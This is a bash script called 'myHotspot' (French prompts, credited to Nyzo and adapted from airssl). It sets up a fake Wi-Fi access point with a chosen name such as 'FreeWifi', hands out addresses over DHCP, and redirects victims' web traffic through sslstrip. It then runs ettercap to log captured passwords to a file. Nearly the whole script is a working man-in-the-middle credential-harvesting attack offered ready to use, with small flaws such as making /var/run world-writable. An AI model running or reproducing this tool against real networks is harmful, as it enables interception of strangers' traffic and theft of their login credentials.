#!/bin/bash
# Copyright 2015 - Nyzo
# myHotspot - version 1.0

if [ "$1" == "kill" ];then
# Clean up if not pressed y
echo
echo "[+] Cleaning up airssl and resetting iptables..."

echo -n "Enter your interface used for the fake AP, generally wlan0 or wlan1: "
fakeap_interface="mon0"

pkill airbase-ng
echo "[+] Airbase-ng (fake ap) killed"
pkill dhcpd
echo "[+] DHCP killed"
pkill sslstrip
echo "[+] SSLStrip killed"
pkill ettercap
echo "[+] Ettercap killed"
pkill driftnet
echo "[+] Driftnet killed"
pkill sslstrip.log
echo "[+] SSLStrip log killed"

airmon-ng stop $fakeap_interface
airmon-ng stop $fakeap
echo "[+] Airmon-ng stopped"
echo
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "[+] iptables restored"
echo
ifconfig $internet_interface up
/etc/init.d/networking restart
echo "[+] Restarting network..."

echo "[+] Clean up successful..."
echo "[+] Thank you for using airssl, Good Bye..."
exit
else

# Network questions
echo
echo "myHotspot - Version 1.0  - Par Nyzo"
echo
route -n -A inet | grep UG
echo
echo
echo "Entrez l'IP connectée au réseau, listée ci-dessus :"
read -e gatewayip
echo -n "Entrez l'interface connectée au réseau, listée ci-dessus. Sélectionnez l'interface associé à l'IP précédemment choisie : "
read -e internet_interface
echo -n "Entrez l'interface que vous souhaitez utiliser pour créer le point d'accès wifi. L'interface ne doit pas être connectée à internet :"
read -e fakeap_interface
echo -n "Entrez le nom que vous souhaitez donner au point d'accès wifi (Ex: FreeWifi) :"
read -e ESSID
airmon-ng start $fakeap_interface
fakeap=$fakeap_interface
fakeap_interface="mon0"

# Création de la configuration DHCPD
mkdir -p "/pentest/wireless/airssl"
echo "authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name "\"$ESSID\"";
option domain-name-servers 10.0.0.1;

range 10.0.0.20 10.0.0.50;

}" > /pentest/wireless/airssl/dhcpd.conf

# Création du point d'accès wifi
echo "[+] Configuration du point d'accès wifi"
echo
echo "[+] Starting FakeAP..."
xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng --essid -c 1 "$ESSID" $fakeap_interface & fakeapid=$!
disown
sleep 5

# Tables
echo "[+] Configuring forwarding tables..."
ifconfig lo up
ifconfig at0 up
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# DHCP
echo "[+] Configuration et démarrage DHCP"
chmod 777 /var/run/
touch /var/run/dhcpd.pid
chown dhcpd:dhcpd /var/run/dhcpd.pid
xterm -xrm '*hold: true' -geometry 75x20+1+100 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/airssl/dhcpd.conf" at0 & dchpid=$!
disown
sleep 5

# Sslstrip
echo "[+] Configuration et démarrage de SSLStrip"
xterm -geometry 75x15+1+200 -T SSLStrip -e sslstrip -f -p -k 10000 & sslstripid=$!
sleep 5

# Ettercap
echo "[+] Configuration et démarrage de Ettercap"
xterm -xrm '*hold: true' -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /pentest/wireless/airssl/passwords -i at0 & ettercapid=$!
disown
sleep 5

#SSLStrip Log
echo "[+] Configuration et démarrage de SSLStrip Log"
xterm -geometry 75x15+1+600 -T "SSLStrip Log" -e tail -f sslstrip.log & sslstriplogid=$!
sleep 5

clear
echo "[+] Activation"
echo "PRESSEZ Y POUR QUITTER"
read WISH

# Clean up
if [ $WISH = "y" ] ; then
echo
echo "[+] Cleaning up airssl and resetting iptables..."

kill ${fakeapid}
echo "[+] Airbase-ng (fake ap) killed"
kill ${dchpid}
echo "[+] DHCP killed"
kill ${sslstripid}
echo "[+] SSLStrip killed"
kill ${ettercapid}
echo "[+] Ettercap killed"
kill ${driftnetid}
echo "[+] Driftnet killed"
kill ${sslstriplogid}
echo "[+] SSLStrip log killed"

airmon-ng stop $fakeap_interface
airmon-ng stop $fakeap
echo "[+] Airmon-ng stopped"
echo
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "[+] iptables restored"
echo
ifconfig $internet_interface up
/etc/init.d/networking restart
echo "[+] Restarting network..."

echo "[+] Clean up successful..."
echo "[+] Thank you for using airssl, Good Bye..."
fi
exit

fi

exit
